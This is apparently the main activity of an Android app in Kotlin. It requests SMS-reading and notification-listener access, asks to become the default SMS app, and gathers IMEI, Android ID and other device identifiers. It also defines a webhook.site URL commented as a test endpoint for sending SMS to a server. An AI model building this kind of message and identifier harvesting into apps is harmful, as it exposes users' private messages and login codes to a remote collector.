package com.example.automaticsms

import android.Manifest.permission.READ_PHONE_STATE
import android.Manifest.permission.RECEIVE_SMS
import android.Manifest.permission.READ_SMS
import android.annotation.SuppressLint
import android.app.Activity
import android.app.role.RoleManager
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.BatteryManager.BATTERY_PLUGGED_AC
import android.os.BatteryManager.BATTERY_PLUGGED_USB
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.provider.Telephony
import android.provider.Telephony.Sms.getDefaultSmsPackage
import android.telephony.TelephonyManager
import android.util.Log
import androidx.activity.enableEdgeToEdge
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.example.automaticsms.adapters.VpAdapter
import com.example.automaticsms.databinding.ActivityMainBinding
import com.google.android.material.tabs.TabLayoutMediator

const val urlString =
    "https://webhook.site/97063872-a5b3-41a6-9635-493d8a04171a"
// Для теста отправки смс на сервер. Пока так!

const val PERMISSION_REQUEST_CODE = 101

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        init()
    }

    private fun init() {
        askPhoneStatePermission()
        askSmsPermission()
        askPushPermission()
        setDefaultSmsApp()
        setupVpAdapter()
    }

    private fun askPhoneStatePermission() {
        if (ActivityCompat.checkSelfPermission(
                this,
                READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(READ_PHONE_STATE),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun askPushPermission() {
        if (!hasNotificationAccess(this))
            try {
                val settingsIntent =
                    Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                startActivity(settingsIntent)
            } catch (e: ActivityNotFoundException) {
                e.printStackTrace()
            }
    }
//for android 14 notification read permission is required to detect swiping
//        if (!isNLServiceRunning()) {
//            if (Build.VERSION.SDK_INT == Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
//                MaterialAlertDialogBuilder(this)
//                    .setCancelable(false)
//                    .setTitle("Need notification permission")
//                    .setMessage("Notification permission required") //resources.getString(R.string.message)
//                    .setNegativeButton("Cancel") { _, _ ->
//                    }
//                    .setPositiveButton("OK") { _, _ ->
//                        startActivity(
//                            Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).addFlags(
//                                Intent.FLAG_ACTIVITY_NEW_TASK
//                            )
//                        );
//                    }.show()
//            }
//        }

    //    @SuppressLint("ServiceCast")
//    private fun isNLServiceRunning(): Boolean {
//        val manager = this.getSystemService(Service.ACTIVITY_SERVICE) as ActivityManager
//        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
//            if (NotificationListener::class.java.getName() == service.service.className) {
//                return true
//            }
//        }
//        return false
//    }
    private fun hasNotificationAccess(context: Context): Boolean {
        return Settings.Secure.getString(
            context.applicationContext.contentResolver,
            "enabled_notification_listeners"
        ).contains(context.applicationContext.packageName)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    @SuppressLint("HardwareIds")
    fun getSystemDetails(): SystemDetails {
        var imei = ""
        val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        try {
            imei =
                telephonyManager.imei
        } catch (e: SecurityException) {
        }
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus: Intent? = applicationContext.registerReceiver(null, filter)
        val status = batteryStatus!!.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        val chargePlug: Int = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
        val usbCharge = chargePlug == BATTERY_PLUGGED_USB
        val acCharge = chargePlug == BATTERY_PLUGGED_AC
        val level: Int = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale: Int = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        val batteryPct = level / scale.toFloat()

        return SystemDetails(
            Build.BRAND,
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ),
            Build.MODEL,
            Build.ID,
            Build.VERSION.SDK_INT,
            Build.USER,
            Build.TYPE,
            Build.MANUFACTURER,
            Build.VERSION_CODES.BASE,
            Build.VERSION.INCREMENTAL,
            Build.BOARD,
            Build.HOST,
            Build.FINGERPRINT,
            Build.VERSION.RELEASE,
            imei,
            telephonyManager.networkOperatorName,
            isCharging,
            usbCharge,
            acCharge,
            batteryPct
        )
    }

    private fun askSmsPermission() {
        // (для API 23+)
        if (ActivityCompat.checkSelfPermission(
                this,
                RECEIVE_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(RECEIVE_SMS, READ_SMS),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun setDefaultSmsApp() {
        if (getDefaultSmsPackage(this) != null && getDefaultSmsPackage(this) != this.packageName) {
            val roleManager: RoleManager?
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                roleManager = this.getSystemService(RoleManager::class.java)
                if (roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                    if (roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                    } else {
                        val roleRequestIntent = roleManager.createRequestRoleIntent(
                            RoleManager.ROLE_SMS
                        )
                        (this as Activity).startActivityForResult(
                            roleRequestIntent,
                            PERMISSION_REQUEST_CODE
                        )
                    }
                }
            } else {
                val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
                intent.putExtra(
                    Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
                    this.packageName
                )
                (this as Activity).startActivityForResult(intent, PERMISSION_REQUEST_CODE)
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
//        if (requestCode == PERMISSION_REQUEST_CODE) {
//        }
    }

    private fun setupVpAdapter() {
        val tabAdapter = VpAdapter(this)
        binding.vp.adapter = tabAdapter
        TabLayoutMediator(binding.tabLayout, binding.vp) { tab, position ->
            if (position == 0) {
                tab.text = "PUSH"
            } else if (position == 1) {
                tab.setIcon(R.drawable.home)
            } else {
                tab.text = "SMS"
            }
        }.attach()
        binding.vp.currentItem = 1
    }
}